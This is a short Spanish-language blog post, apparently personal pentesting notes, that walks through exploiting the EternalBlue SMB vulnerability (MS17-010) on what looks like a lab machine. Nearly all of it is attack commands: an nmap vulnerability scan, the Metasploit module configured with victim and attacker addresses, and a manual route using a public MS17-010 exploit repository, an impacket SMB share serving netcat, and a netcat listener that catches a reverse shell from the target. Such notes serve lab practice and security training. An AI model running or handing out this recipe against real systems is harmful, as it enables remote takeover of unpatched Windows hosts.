---
title: "Eternal Blue"
author: Tuch0
date: 2023-09-17
categories: [Vectores-de-Ataque]
tags: [eternal_blue, MetasPloit]
image:
    path: assets/Miniaturas/VectoresDeAtaque/eternalBlue.jpg
    width: 800
    height: 500
---

```bash
# Miramos las categorias de nmap
locate .nse | xargs grep "caqtegories" | grep -oP '".*?"' --colour | sort -u

# Hacemos un escaneo de dos categorias en concreto
nmap -script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
```

### Metasploit

![](../../assets/VectoresDeAtaque/Eternal-Blue/1.jpg)

```bash
# Buscamos la vulnerabilidad
search eternal blue

# Seleccionamos el modulo
use 0

# Miramos las opciones
options

# Rellenamos las opciones con SET
set RHOST <ip_víctima>
set RPORT 445
set LHOST <ip_atacante>
set LPORT <ip_escucha>

# Ejecutamos el exploit
run
```

![](../../assets/VectoresDeAtaque/Eternal-Blue/2.jpg)



### Manual

#### Checker.py

```bash
# Descargamos recursos
git clone https://github.com/worawit/MS17-010

# Entramos en el recurso
cd MS17-010

# Primero usamos el checker para validar la explotación
python2 checker.py <RHOST> # ->> Deberia de poner en los pipes algun OK , pero si no funciona , cambia esto:

# Si no te detecta los named pipes , edita el exploit
nvim checker.py
USERNAME = 'guest'

# Lo volvemos a ejecutar
python2 checker.py <RHOST>
```

#### zzz_exploit.py

```bash
# Editamos el escript 
nvim zzz_exploit.py
USERNAME = 'guest'
```

![](../../assets/VectoresDeAtaque/Eternal-Blue/3.jpg)



```bash
# Descargamos el binario de NC para win
https://eternallybored.org/misc/netcat

# Descomprimes el archivo
7z x netcat -d netcat
cd netcat
cp nc64.exe ../scripts
cd ../scripts
mv nc64.exe nc.exe

# Creamos una carpeta compartida con impacket-smbserver
impacket-smbserver smbFolder $(pwd) -smb2support

# Nos ponemos en escucha por netcat
rlwrap nc -lvnp 443

# Iniciamos el exploit
python3 zzz_exploit.py <RHOST> [pipe_name]
```

